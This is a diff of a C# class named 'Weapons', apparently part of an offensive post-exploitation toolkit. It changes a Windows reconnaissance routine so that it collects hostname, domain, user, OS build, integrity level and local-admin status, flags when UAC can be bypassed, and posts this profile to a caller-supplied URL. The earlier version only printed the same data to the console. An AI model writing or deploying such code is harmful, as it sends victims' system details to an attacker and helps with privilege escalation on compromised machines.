@@ -1,34 +1,29 @@
 ﻿using Microsoft.Win32;
 using System;
-using System.Diagnostics;
 using System.DirectoryServices.AccountManagement;
-using System.IO;
-using System.Management.Automation;
-using System.Management.Automation.Runspaces;
 using System.Net;
 using System.Net.NetworkInformation;
 using System.Security.Principal;
 using System.Text;
-using System.Text.RegularExpressions;
 
 class Weapons
 {
     // Basic System Information Gathering
-    public static void ListBasicOSInfo()
+    public static void ListBasicOSInfo(string url)
     {
-        string ProductName = GetRegValue("HKLM", "Software\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
-        string EditionID = GetRegValue("HKLM", "Software\\Microsoft\\Windows NT\\CurrentVersion", "EditionID");
-        string ReleaseId = GetRegValue("HKLM", "Software\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId");
-        string BuildBranch = GetRegValue("HKLM", "Software\\Microsoft\\Windows NT\\CurrentVersion", "BuildBranch");
-        string CurrentMajorVersionNumber = GetRegValue("HKLM", "Software\\Microsoft\\Windows NT\\CurrentVersion", "CurrentMajorVersionNumber");
-        string CurrentVersion = GetRegValue("HKLM", "Software\\Microsoft\\Windows NT\\CurrentVersion", "CurrentVersion");
-
-        bool isHighIntegrity = IsHighIntegrity();
-        bool isLocalAdmin = IsLocalAdmin();
+        string ProductName = Utils.GetRegValue("HKLM", "Software\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
+        string EditionID = Utils.GetRegValue("HKLM", "Software\\Microsoft\\Windows NT\\CurrentVersion", "EditionID");
+        string ReleaseId = Utils.GetRegValue("HKLM", "Software\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId");
+        string BuildBranch = Utils.GetRegValue("HKLM", "Software\\Microsoft\\Windows NT\\CurrentVersion", "BuildBranch");
+        string CurrentMajorVersionNumber = Utils.GetRegValue("HKLM", "Software\\Microsoft\\Windows NT\\CurrentVersion", "CurrentMajorVersionNumber");
+        string CurrentVersion = Utils.GetRegValue("HKLM", "Software\\Microsoft\\Windows NT\\CurrentVersion", "CurrentVersion");
 
         string arch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
-        string userName = Environment.GetEnvironmentVariable("USERNAME");
+        string userName = WindowsIdentity.GetCurrent().Name;
         string ProcessorCount = Environment.ProcessorCount.ToString();
+
+        bool isHighIntegrity = Utils.IsHighIntegrity();
+        bool isLocalAdmin = Utils.IsLocalAdmin(userName);
 
         DateTime now = DateTime.UtcNow;
         DateTime boot = now - TimeSpan.FromMilliseconds(Environment.TickCount);
@@ -37,87 +32,87 @@ class Weapons
         String strHostName = Dns.GetHostName();
         IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();
         string dnsDomain = properties.DomainName;
+        StringBuilder sb = new StringBuilder();
 
-        Console.WriteLine("\r\n\r\n=== Basic OS Information ===\r\n");
-        Console.WriteLine(String.Format("  {0,-30}:  {1}", "Hostname", strHostName));
-        Console.WriteLine(String.Format("  {0,-30}:  {1}", "Domain Name", dnsDomain));
-        Console.WriteLine(String.Format("  {0,-30}:  {1}", "Username", WindowsIdentity.GetCurrent().Name));
-        Console.WriteLine(String.Format("  {0,-30}:  {1}", "ProductName", ProductName));
-        Console.WriteLine(String.Format("  {0,-30}:  {1}", "EditionID", EditionID));
-        Console.WriteLine(String.Format("  {0,-30}:  {1}", "ReleaseId", ReleaseId));
-        Console.WriteLine(String.Format("  {0,-30}:  {1}", "BuildBranch", BuildBranch));
-        Console.WriteLine(String.Format("  {0,-30}:  {1}", "CurrentMajorVersionNumber", CurrentMajorVersionNumber));
-        Console.WriteLine(String.Format("  {0,-30}:  {1}", "CurrentVersion", CurrentVersion));
-        Console.WriteLine(String.Format("  {0,-30}:  {1}", "Architecture", arch));
-        Console.WriteLine(String.Format("  {0,-30}:  {1}", "ProcessorCount", ProcessorCount));
-        Console.WriteLine(String.Format("  {0,-30}:  {1}", "BootTime (approx)", BootTime));
-        Console.WriteLine(String.Format("  {0,-30}:  {1}", "HighIntegrity", isHighIntegrity));
-        Console.WriteLine(String.Format("  {0,-30}:  {1}", "IsLocalAdmin", isLocalAdmin));
+        sb.AppendLine("\r\n  === Basic Info Gathering ===");
+        sb.AppendLine(String.Format("  {0,-30}:  {1}", "Hostname", strHostName));
+        sb.AppendLine(String.Format("  {0,-30}:  {1}", "Domain Name", dnsDomain));
+        sb.AppendLine(String.Format("  {0,-30}:  {1}", "Username", userName));
+        sb.AppendLine(String.Format("  {0,-30}:  {1}", "ProductName", ProductName));
+        sb.AppendLine(String.Format("  {0,-30}:  {1}", "EditionID", EditionID)); 
+        sb.AppendLine(String.Format("  {0,-30}:  {1}", "ReleaseId", ReleaseId));
+        sb.AppendLine(String.Format("  {0,-30}:  {1}", "BuildBranch", BuildBranch));
+        sb.AppendLine(String.Format("  {0,-30}:  {1}", "CurrentMajorVersionNumber", CurrentMajorVersionNumber));
+        sb.AppendLine(String.Format("  {0,-30}:  {1}", "CurrentVersion", CurrentVersion));
+        sb.AppendLine(String.Format("  {0,-30}:  {1}", "Architecture", arch));
+        sb.AppendLine(String.Format("  {0,-30}:  {1}", "ProcessorCount", ProcessorCount));
+        sb.AppendLine(String.Format("  {0,-30}:  {1}", "BootTime (approx)", BootTime));
+        sb.AppendLine(String.Format("  {0,-30}:  {1}", "HighIntegrity", isHighIntegrity));
+        sb.AppendLine(String.Format("  {0,-30}:  {1}", "IsLocalAdmin", isLocalAdmin));
 
         if (!isHighIntegrity && isLocalAdmin)
         {
-            Console.WriteLine("    [*] In medium integrity but user is a local administrator- UAC can be bypassed.");
+            sb.AppendLine("    -- UAC can be bypassed. --");
         }
 
+        Utilities.Post(url, sb.ToString());
     }
-
-    private static string GetRegValue(string hive, string path, string value)
+    
+    class Utils
     {
-        // returns a single registry value under the specified path in the specified hive (HKLM/HKCU)
-        string regKeyValue = "";
-        if (hive == "HKCU")
+        public static string GetRegValue(string hive, string path, string value)
         {
-            var regKey = Registry.CurrentUser.OpenSubKey(path);
-            if (regKey != null)
+            string regKeyValue = "";
+            if (hive == "HKCU")
             {
-                regKeyValue = String.Format("{0}", regKey.GetValue(value));
+                var regKey = Registry.CurrentUser.OpenSubKey(path);
+                if (regKey != null)
+                {
+                    regKeyValue = String.Format("{0}", regKey.GetValue(value));
+                }
+                return regKeyValue;
             }
-            return regKeyValue;
+            else if (hive == "HKU")
+            {
+                var regKey = Registry.Users.OpenSubKey(path);
+                if (regKey != null)
+                {
+                    regKeyValue = String.Format("{0}", regKey.GetValue(value));
+                }
+                return regKeyValue;
+            }
+            else
+            {
+                var regKey = Registry.LocalMachine.OpenSubKey(path);
+                if (regKey != null)
+                {
+                    regKeyValue = String.Format("{0}", regKey.GetValue(value));
+                }
+                return regKeyValue;
+            }
         }
-        else if (hive == "HKU")
+
+        public static bool IsHighIntegrity()
         {
-            var regKey = Registry.Users.OpenSubKey(path);
-            if (regKey != null)
-            {
-                regKeyValue = String.Format("{0}", regKey.GetValue(value));
-            }
-            return regKeyValue;
+            WindowsIdentity identity = WindowsIdentity.GetCurrent();
+            WindowsPrincipal principal = new WindowsPrincipal(identity);
+            return principal.IsInRole(WindowsBuiltInRole.Administrator);
         }
-        else
+
+        public static bool IsLocalAdmin(string userName)
         {
-            var regKey = Registry.LocalMachine.OpenSubKey(path);
-            if (regKey != null)
+
+            PrincipalContext ctx = new PrincipalContext(ContextType.Machine);
+            UserPrincipal usr = UserPrincipal.FindByIdentity(ctx, IdentityType.SamAccountName, userName);
+
+            foreach (Principal p in usr.GetAuthorizationGroups())
             {
-                regKeyValue = String.Format("{0}", regKey.GetValue(value));
+                if (p.ToString() == "Administrators")
+                {
+                    return true;
+                }
             }
-            return regKeyValue;
+            return false;
         }
     }
-
-    private static bool IsHighIntegrity()
-    {
-        // returns true if the current process is running with adminstrative privs in a high integrity context
-        WindowsIdentity identity = WindowsIdentity.GetCurrent();
-        WindowsPrincipal principal = new WindowsPrincipal(identity);
-        return principal.IsInRole(WindowsBuiltInRole.Administrator);
-    }
-
-    private static bool IsLocalAdmin()
-    {
-        // returns true if the current user is a local administrator
-        string userName = WindowsIdentity.GetCurrent().Name;
-
-        PrincipalContext ctx = new PrincipalContext(ContextType.Machine);
-        UserPrincipal usr = UserPrincipal.FindByIdentity(ctx, IdentityType.SamAccountName, userName);
-
-        foreach (Principal p in usr.GetAuthorizationGroups())
-        {
-            if (p.ToString() == "Administrators")
-            {
-                return true;
-            }
-        }
-        return false;
-    }
-
 }
